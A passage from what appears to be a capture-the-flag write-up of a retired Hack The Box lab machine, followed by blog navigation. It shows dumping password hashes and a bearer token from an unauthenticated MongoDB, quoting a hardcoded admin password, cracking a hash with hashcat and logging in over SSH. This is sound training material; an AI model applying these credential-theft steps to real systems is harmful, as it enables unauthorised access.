}</code></pre><figcaption>/var/www/app/configuration/connect_db.js</figcaption></figure><p>As shown above, we don't need a password to be able to connect to the <code>testing</code> database.</p><pre><code>$ netstat -tunpl | grep 27017
tcp     0     0     127.0.0.1:27017     0.0.0.0:*     LISTEN     -

$ which mongo
/usr/bin/mongo

$ /usr/bin/mongo
MongoDB shell version v4.4.29
connecting to: mongodb://127.0.0.1:27017/?
[...]

&gt; show dbs;
admin    0.000GB
config   0.000GB
local    0.000GB
testing  0.000GB

&gt; use testing;
switched to db testing

&gt; show collections;
messages
users

&gt; db.users.find()
{ "_id" : ObjectId("648874de313b8717284f457c"), "name" : "admin", "email" : "admin@chatbot.htb", "password" : "$2b$10$VSrvhM/5YGM0uyCeEYf/TuvJzzTz.jDLVJ2QqtumdDoKGSa.6aIC.", "terms" : true, "value" : true, "authorization_token" : "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOiI2NDg4NzRkZTMxM2I4NzE3Mjg0ZjQ1N2MiLCJpYXQiOjE3MjI1OTU2NDd9.iwgmNmvtm1s6WYvy4AbElQ1Hz3bvnd6UKkT2pHTntrs", "__v" : 0 }
{ "_id" : ObjectId("648874de313b8717284f457d"), "name" : "frank_dorky", "email" : "frank_dorky@chatbot.htb", "password" : "$2b$10$hrB/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s.elpsB4J6", "terms" : true, "value" : true, "authorization_token" : " ", "__v" : 0 }</code></pre><p>So, we have an encrypted password for the <code>admin</code> user, but this is not super relevant since the unencrypted version is hardcoded in the source code, and we can confirm it's not valid for <code>SSH</code>:</p><figure class="kg-card kg-code-card"><pre><code class="language-javascript">// [...]
await page.goto('http://chatbot.htb/static/index.html', { timeout: 30000 });
// [...]
await page.type('#email', 'admin@chatbot.htb');
await page.type('#password', 'iamnottheadmin$');
// [...]</code></pre><figcaption>/var/www/automation/index.js</figcaption></figure><p>So this leaves us with the <code>frank_dorky</code> encrypted password:</p><pre><code>~ hashcat -a 0 -m 3200 frank_hash.txt rockyou-75.txt --status --status-timer=10 -w 3</code></pre><pre><code>~ ssh frank_dorky@chatbot.htb
frank_dorky@chatbot.htb's password:
&gt; manchesterunited

frank_dorky@formulax:~$</code></pre>
    </section>


</article>

<section class="footer-cta">
    <div class="inner">
        <h2>Sign up for more like this.</h2>
        <a class="footer-cta-button" href="index.html#/portal">
            <div>Enter your email</div>
            <span>Subscribe</span>
        </a>
    </div>
</section>


<aside class="read-more-wrap">
    <div class="read-more inner">


                    
<article class="post-card post ">

    <a class="post-card-image-link" href="../automate-threat-modeling-with-pytm-and-github-actions/index.html">
        <img class="post-card-image"
            srcset="../content/images/size/w300/2024/11/Screenshot-2024-11-14-at-12.28.19.png 300w,
                   ../content/images/size/w600/2024/11/Screenshot-2024-11-14-at-12.28.19.png 600w,
                  ../content/images/size/w1000/2024/11/Screenshot-2024-11-14-at-12.28.19.png 1000w,
                 ../content/images/size/w2000/2024/11/Screenshot-2024-11-14-at-12.28.19.png 2000w"
            sizes="(max-width: 1000px) 400px, 800px"
            src="../content/images/size/w600/2024/11/Screenshot-2024-11-14-at-12.28.19.png"
            alt="Automate Threat Modeling with pytm and Github Actions"
            loading="lazy"
        />
    </a>

    <div class="post-card-content">

        <a class="post-card-content-link" href="../automate-threat-modeling-with-pytm-and-github-actions/index.html">
            <header class="post-card-header">
                <h2 class="post-card-title">Automate Threat Modeling with pytm and Github Actions</h2>
            </header>
            <section class="post-card-excerpt">
                <p>pytm is a OWASP tool that integrates with a custom GPT to make the threat modeling process quicker and more automated. I've developed a custom Github Action that, on every Pull Request event, generates or updates a Threat Model report, based on changes to Python files that describe the project's</p>
            </section>
        </a>

        <footer class="post-card-meta">
            <ul class="author-list">
                <li class="author-list-item">
                    <a href="../author/ines/index.html" class="static-avatar">
                        <img class="author-profile-image" src="../content/images/size/w100/2022/08/1658857349956.jpeg" alt="Inês Martins" />
                    </a>
                </li>
            </ul>
            <div class="post-card-byline-content">
                <span><a href="../author/ines/index.html">Inês Martins</a></span>
                <span class="post-card-byline-date"><time datetime="2024-11-14">Nov 14, 2024</time> <span class="bull">&bull;</span> 1 min read</span>
            </div>
        </footer>

    </div>

</article>
                    
<article class="post-card post ">

    <a class="post-card-image-link" href="../htb-writeup-blazorized/index.html">
        <img class="post-card-image"
            srcset="../content/images/size/w300/2024/11/Screenshot-2024-11-13-at-13.35.48.png 300w,
                   ../content/images/size/w600/2024/11/Screenshot-2024-11-13-at-13.35.48.png 600w,
                  ../content/images/size/w1000/2024/11/Screenshot-2024-11-13-at-13.35.48.png 1000w,
                 ../content/images/size/w2000/2024/11/Screenshot-2024-11-13-at-13.35.48.png 2000w"
            sizes="(max-width: 1000px) 400px, 800px"
            src="../content/images/size/w600/2024/11/Screenshot-2024-11-13-at-13.35.48.png"
            alt="HTB Write-up | Blazorized (user-only)"
            loading="lazy"
        />
    </a>

    <div class="post-card-content">

        <a class="post-card-content-link" href="../htb-writeup-blazorized/index.html">
            <header class="post-card-header">
                <h2 class="post-card-title">HTB Write-up | Blazorized (user-only)</h2>
            </header>
            <section class="post-card-excerpt">
                <p>Write-up for Blazorized, a retired HTB Windows machine.</p>
            </section>
        </a>

        <footer class="post-card-meta">
            <ul class="author-list">
                <li class="author-list-item">
                    <a href="../author/ines/index.html" class="static-avatar">
                        <img class="author-profile-image" src="../content/images/size/w100/2022/08/1658857349956.jpeg" alt="Inês Martins" />
                    </a>
                </li>
            </ul>
            <div class="post-card-byline-content">
                <span><a href="../author/ines/index.html">Inês Martins</a></span>
                <span class="post-card-byline-date"><time datetime="2024-11-13">Nov 13, 2024</time> <span class="bull">&bull;</span> 6 min read</span>
            </div>
        </footer>

    </div>

</article>
                    
<article class="post-card post ">

    <a class="post-card-image-link" href="../htb-writeup-iclean/index.html">
        <img class="post-card-image"
            srcset="../content/images/size/w300/2024/11/Screenshot-2024-11-13-at-13.35.59.png 300w,
                   ../content/images/size/w600/2024/11/Screenshot-2024-11-13-at-13.35.59.png 600w,
                  ../content/images/size/w1000/2024/11/Screenshot-2024-11-13-at-13.35.59.png 1000w,
                 ../content/images/size/w2000/2024/11/Screenshot-2024-11-13-at-13.35.59.png 2000w"
            sizes="(max-width: 1000px) 400px, 800px"
            src="../content/images/size/w600/2024/11/Screenshot-2024-11-13-at-13.35.59.png"
            alt="HTB Write-up | iClean (user-only)"
            loading="lazy"
        />
    </a>

    <div class="post-card-content">

        <a class="post-card-content-link" href="../htb-writeup-iclean/index.html">
            <header class="post-card-header">
                <h2 class="post-card-title">HTB Write-up | iClean (user-only)</h2>
            </header>
            <section class="post-card-excerpt">
                <p>Write-up for iClean, a retired HTB Linux machine.</p>
            </section>
        </a>

        <footer class="post-card-meta">
            <ul class="author-list">
                <li class="author-list-item">
                    <a href="../author/ines/index.html" class="static-avatar">
                        <img class="author-profile-image" src="../content/images/size/w100/2022/08/1658857349956.jpeg" alt="Inês Martins" />
                    </a>
                </li>
            </ul>
            <div class="post-card-byline-content">
                <span><a href="../author/ines/index.html">Inês Martins</a></span>
                <span class="post-card-byline-date"><time datetime="2024-08-04">Aug 4, 2024</time> <span class="bull">&bull;</span> 6 min read</span>
            </div>
        </footer>

    </div>

</article>

    </div>
</aside>


    </main>

    <footer class="site-footer outer">
        <div class="inner">
            <section class="copyright"><a href="../index.html"></a> &copy; 2024</section>
            <nav class="site-footer-nav">
                
            </nav>
            <div><a href="https://ghost.org/" target="_blank" rel="noopener">Powered by Ghost</a></div>
        </div>
    </footer>

</div>


<script
    src="https://code.jquery.com/jquery-3.5.1.min.js"
    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
    crossorigin="anonymous">
</script>
<script src="../assets/built/casper.js%3Fv=9cb303b26f"></script>
<script>
$(document).ready(function () {
    // Mobile Menu Trigger
    $('.gh-burger').click(function () {
        $('body').toggleClass('gh-head-open');
    });
    // FitVids - Makes video embeds responsive
    $(".gh-content").fitVids();
});
</script>



</body>
</html>
